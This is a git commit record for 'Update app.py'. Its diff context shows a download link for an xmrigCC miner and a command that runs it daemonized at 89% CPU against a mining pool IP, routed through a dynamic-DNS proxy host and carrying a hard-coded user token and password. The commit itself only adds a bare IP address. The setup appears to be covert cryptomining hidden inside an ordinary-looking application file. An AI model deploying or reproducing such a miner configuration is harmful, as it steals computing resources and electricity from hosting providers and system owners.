7bfffd6b9368e53b00416768ead09555e4726b03
D. SAN. YIL <robinexx@gmail.com>
2022-11-30 21:16:27 +0300

    Update app.py

--- app.py
+++ app.py
@@ -17,4 +17,6 @@ https://github.com/Bendr0id/xmrigCC/releases/download/3.3.1/xmrigCC-miner_only-3
 
 --daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x ads.bounceme.net:16358 -u 7pRk4QhDsn+PBkh+d6+pvJjZ9lR9C2uH --donate-level 1 -a rx/xdag -B -p tlineFinland0
     
-    
+	
+192.171.0.195
+ 
